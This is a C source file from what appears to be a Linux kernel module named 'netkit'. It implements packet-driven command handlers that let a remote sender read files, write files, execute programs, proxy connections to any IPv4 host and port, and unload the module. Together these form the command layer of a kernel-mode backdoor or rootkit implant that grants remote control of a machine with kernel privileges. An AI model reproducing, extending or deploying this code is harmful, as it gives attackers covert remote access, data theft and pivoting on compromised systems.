#include <linux/types.h>
#include <linux/module.h>
#include <linux/inet.h>
#include <linux/net.h>
#include <linux/syscalls.h>
#include <linux/kthread.h>
#include <linux/freezer.h>
#include <linux/sched.h>

#include "handlers.h"

#include "../packet/packet.h"
#include "../../sys/mem.h"
#include "../../sys/socket.h"
#include "../../sys/file.h"
#include "../../sys/symbol.h"
#include "../../sys/task.h"
#include "../../sys/debug.h"
#include "../../netkit.h"

int cmd_handle_file_read(const struct packet_req *packet, u8 **res_buf, size_t *res_buflen)
{
    size_t filename_len;
    char *filename;
    int retv;

    if (packet->content_len == 0)
        return -EINVAL;

    // mitigate vuln when no nb and packet->content_len = CHUNK_SIZE
    filename_len = packet->content_len + 1;
    filename = kzmalloc(filename_len, GFP_KERNEL);
    if (IS_ERR(filename))
        return PTR_ERR(filename);

    memcpy(filename, packet->content, filename_len - 1);
    filename[filename_len - 1] = '\x00'; // add nullbyte

    retv = file_read(filename, res_buf, res_buflen);
    
    kzfree(filename, filename_len);
    
    return retv;
}

int cmd_handle_file_write(const struct packet_req *packet, u8 **res_buf, size_t *res_buflen)
{
    size_t filename_len;
    char *filename;
    size_t content_len;
    int retv;

    if (packet->content_len == 0)
        return -EINVAL;

    // mitigate vuln when no nb and packet->content_len = CHUNK_SIZE
    filename_len = strnlen(packet->content, packet->content_len) + 1;
    filename = kzmalloc(filename_len, GFP_KERNEL);
    if (IS_ERR(filename))
        return PTR_ERR(filename);

    memcpy(filename, packet->content, filename_len - 1);
    filename[filename_len - 1] = '\x00'; // add nullbyte

    // when filename_len == packet->content_len+1, i.e. content doesn't include nb
    content_len = packet->content_len - filename_len;
    if (content_len == SIZE_MAX)
        content_len = 0;

    retv = file_write(filename, packet->content + filename_len, content_len);
    
    kzfree(filename, filename_len);
    
    return retv;
}

int cmd_handle_file_exec(const struct packet_req *packet, u8 **res_buf, size_t *res_buflen)
{
    size_t filename_len;
    char *filename;
    int retv;

    if (packet->content_len == 0)
        return -EINVAL;

    // mitigate vuln when no nb and packet->content_len = CHUNK_SIZE
    filename_len = packet->content_len + 1;
    filename = kzmalloc(filename_len, GFP_KERNEL);
    if (IS_ERR(filename))
        return PTR_ERR(filename);

    memcpy(filename, packet->content, filename_len - 1);
    filename[filename_len - 1] = '\x00'; // add nullbyte

    retv = file_exec(filename, res_buf, res_buflen);
    
    kzfree(filename, filename_len);
    
    return retv;
}

int cmd_handle_proxy(const struct packet_req *packet, u8 **res_buf, size_t *res_buflen)
{
    if (packet->content_len < 6)
        return -EMSGSIZE;

    return socket_proxy(*(__be32*)packet->content, *(__be16*)(packet->content+4), packet->content+6, packet->content_len-6, res_buf, res_buflen);
}

int cmd_handle_exit(const struct packet_req *packet, u8 **res_buf, size_t *res_buflen)
{
    // run as kthread so underlaying layers can cleanup and round up the IO
    // conn-xyz --[spawn]--> netkit-exit --[call]--> netkit->exit() --[kill]--> {netkit-conn-loop, conn-xyz} 
    kthread_run(module_stop, THIS_MODULE, "netkit-exit");

    return 0;
}